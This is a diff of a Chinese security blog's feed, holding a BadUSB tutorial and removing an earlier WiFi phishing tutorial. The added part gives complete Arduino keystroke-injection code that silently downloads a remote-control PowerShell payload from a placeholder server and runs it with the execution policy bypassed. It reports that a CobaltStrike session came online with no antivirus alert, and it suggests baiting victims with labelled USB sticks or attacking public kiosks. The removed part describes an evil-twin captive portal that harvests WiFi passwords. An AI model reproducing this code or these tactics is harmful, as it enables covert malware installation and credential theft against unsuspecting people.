+<h4 id="烧录制作"><a href="#烧录制作" class="headerlink" title="烧录制作"></a>烧录制作</h4><p>下面我们可以进行badusb开发板的烧录</p>
+<p>将硬件插入电脑，查看一下对应端口</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/11.png" alt="图片"></p>
+<p>打开Arduino IDE，工具-&gt;板-&gt;选择”Arduino Leonardo”和对应端口</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/12.png" alt="图片"></p>
+<p>将以下代码粘贴到arduino</p>
+<pre class="line-numbers language-none"><code class="language-none">#include&lt;Keyboard.h&gt;
+void setup() &#123;
+  &#x2F;&#x2F; putpower shell your setup code here, to run once
+  Keyboard.begin();&#x2F;&#x2F;开始键盘通讯 
+delay(3000);&#x2F;&#x2F;延时 
+Keyboard.press(KEY_LEFT_GUI);&#x2F;&#x2F;win键 
+delay(500);
+Keyboard.press(&#39;r&#39;);&#x2F;&#x2F;r键
+delay(500); 
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release(&#39;r&#39;); 
+Keyboard.press(KEY_CAPS_LOCK);&#x2F;&#x2F;利用开大写输小写绕过输入法
+Keyboard.release(KEY_CAPS_LOCK);
+delay(500);
+Keyboard.println(&quot;CMD  &#x2F;q &#x2F;d &#x2F;f:off &#x2F;v:on &#x2F;k MODE con: cols&#x3D;15 lines&#x3D;1&quot;);  &#x2F;&#x2F;无回显
+&#x2F;&#x2F;Keyboard.println(&quot;cmd &#x2F;T:01 &#x2F;K \&quot;@echo off &amp;&amp; mode con:COLS&#x3D;15 LINES&#x3D;1\&quot;&quot;);   &#x2F;&#x2F;有回显
+delay(500);
+Keyboard.press(KEY_RETURN); 
+Keyboard.release(KEY_RETURN); 
+delay(2000);
+Keyboard.println(&quot;powershell\n&quot;);
+Keyboard.println(&quot;$clnt &#x3D; new-object system.net.webclient;\n&quot;);
+Keyboard.println(&quot;$url&#x3D; &#39;http:&#x2F;&#x2F;xxx.xxx.xxx:xxxx&#x2F;payload.ps1&#39;;\n&quot;);  &#x2F;&#x2F;远程服务器ps1远控地址
+Keyboard.println(&quot;$file &#x3D; &#39;d:\\xxx.ps1&#39;;\n&quot;);      &#x2F;&#x2F;下载到目标存放文件的地址
+Keyboard.println(&quot;$clnt.downloadfile($url,$file)\n&quot;);  &#x2F;&#x2F;采用分段执行绕过防火墙进程防护
+Keyboard.println(&quot;powershell.exe -executionpolicy bypass -file d:\\xxx.ps1&quot;); &#x2F;&#x2F;本地权限绕过执行木马脚本
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+Keyboard.press(KEY_CAPS_LOCK); 
+Keyboard.release(KEY_CAPS_LOCK);
+Keyboard.end();&#x2F;&#x2F;结束键盘通讯 
+&#125;
+ 
+void loop() &#123;
+  &#x2F;&#x2F; put your main code here, to run repeatedly:
+ 
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>代码大体意思：</p>
+<ul>
+<li>插入BadUsb后等待3秒</li>
+<li>按下Windows+R</li>
+<li>切换大写绕开输入法</li>
+<li>模拟输入字符串，最小化打开cmd窗口</li>
+<li>隐藏输入特定命令，下载远控并调用powershell执行</li>
+</ul>
+<p>进行烧录程序，先点击第一个编译按钮，无误以后点击第二个进行烧录，等下面的进度条跑完，提示完成</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/13.png" alt="图片"></p>
+<h4 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h4><p>电脑插入BadUSB，桌面会有些许痕迹</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/14.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/15.png" alt="图片"></p>
+<p>会有一个很小的cmd窗口，放大里边没任何内容</p>
+<p>可以看到安全软件也不报毒</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/16.png" alt="图片"></p>
+<p>打开CobaltStrike，发现已经上线</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A1%E2%80%94%E2%80%94U%E7%9B%98%E9%92%93%E9%B1%BC/17.png" alt="图片"></p>
+<h4 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h4><h5 id="1-社工攻击"><a href="#1-社工攻击" class="headerlink" title="1.社工攻击"></a>1.社工攻击</h5><p>把badusb放到一些显眼的地方或者放在地上装有人不小心掉了，可以在表面贴一些贴纸或者写着”内部文件“、”个人资料“等的标签，引诱受害者插入电脑</p>
+<h5 id="2-带有usb的终端机"><a href="#2-带有usb的终端机" class="headerlink" title="2.带有usb的终端机"></a>2.带有usb的终端机</h5><p>各场所终端机器，找到USB接口怼进去，有许多是Windows系统，比如一些自助取票机</p>
+<p>小伙伴们可以根据文章自行复现，但是千万不要做违法的行为哦！</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ">https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ</a></p>
+<p><a href="https://mp.weixin.qq.com/s/hsKIR-KeXf0SrRl8-Fw_TQ">https://mp.weixin.qq.com/s/hsKIR-KeXf0SrRl8-Fw_TQ</a></p>
+<p><a href="https://mp.weixin.qq.com/s/NXNf4sHOSKyQ5ugABQuATw">https://mp.weixin.qq.com/s/NXNf4sHOSKyQ5ugABQuATw</a></p>
+]]></content>
+      <categories>
+        <category>社工安全</category>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>2022.6</tag>
       </tags>
   </entry>
   <entry>
@@ -900,65 +1083,6 @@ int main(int argc, char *argv[])
       </categories>
       <tags>
         <tag>2021.4</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackDemo钓鱼篇①——WiFi钓鱼</title>
-    <url>/2022/06/01/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/</url>
-    <content><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>如今的生活中社工攻击屡见不鲜，其中钓鱼是最为有效而且危害最大的一种攻击手法。攻击者常会伪装成官方、管理员或上级领导向受害者发送信息核实的请求，一旦受害者粗心大意接受了此类请求，其个人信息就会存在泄露的风险。本篇将以一个简单的HackDemo为例子，复现黑客在WiFi钓鱼中的惯用思路，供大家学习和参考。</p>
-<a id="more"></a>
-
-<h3 id="实现工具"><a href="#实现工具" class="headerlink" title="实现工具"></a>实现工具</h3><ul>
-<li><p>Esp8266开发板CH340</p>
-</li>
-<li><p>flash_download_tools_v3.6.5烧录软件</p>
-</li>
-<li><p>DNS.ino.ino.nodemcu.bin烧录文件</p>
-</li>
-<li><p>Arduino IDE_v1.8.5</p>
-</li>
-<li><p>ESP8266 Sketch Data Upload插件</p>
-<p>链接：<a href="https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ">https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ</a><br>提取码：2jp2</p>
-</li>
-</ul>
-<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>连接好Esp8266开发板，在设备管理器中可以查看到对应的端口，如果没有识别需要安装一下驱动(CH341SER.EXE)，默认下一步即可。<br><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/1.png" alt="图片"></p>
-<p>打开flash_download_tools_v3.6.5.exe对开发板进行烧录，点击选择ESP8266 DownloadTool</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/2.png" alt="图片"></p>
-<p>载入DNS.ino.ino.nodemcu.bin文件，选择80MHz、QIO、32Mbit、[对应的端口]、1152000，然后点击START进行烧录，等进度条跑完</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/3.png" alt="图片"></p>
-<p>这时我们发现有一个名字是HH的新wifi，如果没有可以尝试将开发板重新拔插一下。</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/4.png" alt="图片"></p>
-<p>接下来安装Arduino，将工具包中tools目录下的内容拷贝到安装好的Arduino下的tools目录，可以发现在工具栏中多了两个插件。选择工具-&gt;开发板:”Arduino/Genuino Uno”-&gt;开发板管理器</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/8.png" alt="图片"></p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/5.png" alt="图片"></p>
-<p>在搜索框输入esp，选择下面的这个安装2.2.0版本</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/6.png" alt="图片"></p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/7.png" alt="图片"></p>
-<p>新建一个文件，保存到一个路径，然后点击工具-&gt;ESP8266 Sketch Data Upload，弹窗选择否，可以看到保存的文件目录下生成了data文件夹，我们将工具包里data目录下的三个html文件拷贝到生成的data文件夹里</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/9.png" alt="图片"></p>
-<p>选择工具栏下的开发板信息(按照自己的设备配置)，然后再次点击ESP8266 Sketch Data Upload</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/10.png" alt="图片"></p>
-<p>这个过程可能会进行1-2分钟，过程中开发板上的灯光长亮，等灯光熄灭就完成了</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/11.jpg" alt="图片"></p>
-<p>完成以后，连接HH，密码为m1234567，如果没有找到可以尝试重新拔插一下开发板或者重开一下电脑的wifi，连接上访问127.0.0.1/backdoor.html，这是钓鱼的后台，可以看到列出了附近的所有wifi，我们选择通用型，输入想要伪造的wifi序号，点击确认。</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/11.png" alt="图片"></p>
-<p>跳转到提示SSID伪造成功</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/12.png" alt="图片"></p>
-<p>我们连接伪造的这个wifi，没有密码，自动跳转到钓鱼页面，如果受害者安全意识不强可能会填写管理员密码，至此鱼就上钩了。</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/13.png" alt="图片"></p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/14.png" alt="图片"></p>
-<p>受害者点击开始升级会跳转到一个进度条，这些都没什么用，只是给受害者看的。攻击者可以在backdoor看到钓到的密码，至此整个wifi钓鱼成功！</p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/15.png" alt="图片"></p>
-<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/16.png" alt="图片"></p>
-<p>小伙伴们还是要抱着练习的态度进行复现哦，以防走火入魔！</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0</a></p>
-]]></content>
-      <categories>
-        <category>社工安全</category>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>2022.6</tag>
       </tags>
   </entry>
   <entry>
